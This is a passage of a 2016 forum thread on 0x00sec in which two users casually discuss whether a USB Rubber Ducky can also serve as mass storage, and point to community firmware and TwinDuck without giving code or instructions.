<div id="post_9" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/SmartOne"><span itemprop="name">SmartOne</span></a>
(Not a N00b, but still learning)
</span>
<link itemprop="mainEntityOfPage" href="1154.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-10-01T14:22:39Z" class="post-time">
October 1, 2016, 2:22pm
</time>
<meta itemprop="dateModified" content="2016-10-01T14:22:39Z">
<span itemprop="position">9</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Nope, that’s not really what I wanted <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> Just a question: After the DuckyScript has been executed, can the device be used to store data?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_10" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/TheDoctor"><span itemprop="name">TheDoctor</span></a>
(The C# Dude)
</span>
<link itemprop="mainEntityOfPage" href="1154.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-10-01T14:32:02Z" class="post-time">
October 1, 2016, 2:32pm
</time>
<meta itemprop="dateModified" content="2016-10-01T14:32:02Z">
<span itemprop="position">10</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I’ve found <a href="http://usbrubberducky.com/#!resources.md#Community_Edition_Encoder_and_Firmware" rel="nofollow noopener">this one</a> <img src="../../images/emoji/twitter/smile.png%3Fv=9" title=":smile:" class="emoji" alt=":smile:">. If I’m right this custom firmware is even able to be used as Mass Storage <strong>and</strong> Keyboard… Maybe I can find some further information on that <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:">.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_11" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/SmartOne"><span itemprop="name">SmartOne</span></a>
(Not a N00b, but still learning)
</span>
<link itemprop="mainEntityOfPage" href="1154.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-10-01T14:43:38Z" class="post-time">
October 1, 2016, 2:43pm
</time>
<meta itemprop="dateModified" content="2016-10-01T14:43:38Z">
<span itemprop="position">11</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Looks nice! <img src="../../images/emoji/twitter/sunglasses.png%3Fv=9" title=":sunglasses:" class="emoji" alt=":sunglasses:"> I also found TwinDuck, which seems to do similar things (but there are some problems with it as some people write on the internet). Are you on the IRC?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_12" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/TheDoctor"><span itemprop="name">TheDoctor</span></a>
(The C# Dude)
</span>
<link itemprop="mainEntityOfPage" href="1154.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-10-02T07:18:56Z" class="post-time">
October 2, 2016, 7:18am
</time>
<meta itemprop="dateModified" content="2016-10-02T07:18:56Z">
<span itemprop="position">12</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Sorry, went off early yesterday, because I had to write an application for a work experience <img src="../../images/emoji/twitter/smile.png%3Fv=9" title=":smile:" class="emoji" alt=":smile:">. I’ll have a look at both of them and try to figure out how it works <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">. Maybe it’ll get a place as the fourth part?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_13" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/SmartOne"><span itemprop="name">SmartOne</span></a>
(Not a N00b, but still learning)
</span>
<link itemprop="mainEntityOfPage" href="1154.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-10-02T14:51:23Z" class="post-time">
October 2, 2016, 2:51pm
</time>
<meta itemprop="dateModified" content="2016-10-02T14:51:23Z">
<span itemprop="position">13</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Would be great! <img src="../../images/emoji/twitter/grinning.png%3Fv=9" title=":grinning:" class="emoji" alt=":grinning:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_14" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/system"><span itemprop="name">system</span></a>
(system)
Closed
</span>
<link itemprop="mainEntityOfPage" href="1154.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2018-01-21T00:42:21Z" class="post-time">
January 21, 2018, 12:42am
</time>
<meta itemprop="dateModified" content="2018-01-21T00:42:21Z">
<span itemprop="position">14</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
